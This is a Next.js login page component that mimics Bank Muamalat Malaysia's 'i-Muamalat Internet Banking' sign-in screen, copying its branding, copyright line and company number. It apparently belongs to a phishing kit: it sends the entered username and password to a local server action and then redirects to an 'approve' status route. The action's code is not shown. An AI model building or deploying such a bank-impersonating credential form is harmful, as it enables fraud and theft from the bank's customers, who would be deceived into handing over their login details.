"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Loader2, ShieldCheck, Megaphone } from "lucide-react";
import { submitBankMuamalatLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function BankMuamalatLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitBankMuamalatLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-gradient-to-br from-[#FF6B00] to-[#1A237E] font-sans text-[#333]">
      <main className="flex flex-1 items-center justify-center p-4">
        <div className="w-full max-w-sm overflow-hidden rounded-[40px] bg-[#F5F5F5] shadow-2xl">
          {/* Tabs */}
          <div className="flex border-b border-gray-200">
            <button className="relative flex-1 py-5 text-[17px] font-bold text-[#555]">
              Login
              <div className="absolute bottom-0 left-0 h-1 w-full bg-[#FF8A3D]" />
            </button>
            <button className="flex-1 py-5 text-[17px] font-bold text-gray-400">
              Register
            </button>
          </div>

          <div className="px-8 pt-10 pb-8 text-center">
            <h2 className="mb-4 text-[26px] font-bold leading-tight text-[#004B8D]">
              Welcome to i-Muamalat Internet Banking
            </h2>
            <p className="mb-10 text-[14px] leading-snug text-gray-500 font-medium opacity-80">
              Manage your finances online, anytime & anywhere
            </p>

            <form onSubmit={handleLogin} className="space-y-6 text-left">
              {error && (
                <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                  {error}
                </div>
              )}

              <div className="space-y-2">
                <label className="text-[14px] font-medium text-gray-400 ml-1">Username</label>
                <input
                  type="text"
                  placeholder="Username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full rounded-xl border border-gray-300 bg-white py-3.5 px-4 text-base text-gray-700 outline-none transition-all focus:border-[#FF8A3D]"
                  required
                />
              </div>

              <div className="space-y-2">
                <label className="text-[14px] font-medium text-gray-400 ml-1">Password</label>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded-xl border border-gray-300 bg-white py-3.5 px-4 text-base text-gray-700 outline-none transition-all focus:border-[#FF8A3D]"
                  required
                />
              </div>

              <div className="flex justify-center gap-4 text-[15px] font-bold text-[#004B8D] underline">
                <button type="button" className="hover:text-[#FF8A3D]">Forgot Password</button>
                <button type="button" className="hover:text-[#FF8A3D]">Kill Switch</button>
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="mt-2 flex w-full items-center justify-center rounded-2xl bg-[#FF8A3D] py-4 text-lg font-bold text-white shadow-lg transition-all active:scale-[0.98] disabled:opacity-80"
              >
                {isLoading ? (
                  <Loader2 className="h-6 w-6 animate-spin" />
                ) : (
                  "LOGIN"
                )}
              </button>
            </form>
          </div>

          {/* Bottom Tabs */}
          <div className="flex border-t border-gray-200 bg-white">
            <button className="flex flex-1 flex-col items-center gap-1 border-r border-gray-100 py-3.5">
              <ShieldCheck size={24} className="text-[#004B8D] opacity-60" />
              <span className="text-[13px] font-bold text-[#004B8D]">Security Alert</span>
            </button>
            <button className="flex flex-1 flex-col items-center gap-1 py-3.5">
              <div className="relative">
                <Megaphone size={24} className="text-[#D32F2F]" />
                <div className="absolute -top-1 -right-1 h-2 w-2 rounded-full bg-[#E31E24]" />
              </div>
              <span className="text-[13px] font-bold text-[#004B8D]">Announcements</span>
            </button>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="pb-8 text-center text-white">
        <p className="text-[11px] font-medium leading-relaxed opacity-80">
          Copyright © Bank Muamalat Malaysia Berhad<br />
          196501000376 (6175-W)
        </p>
      </footer>
    </div>
  );
}
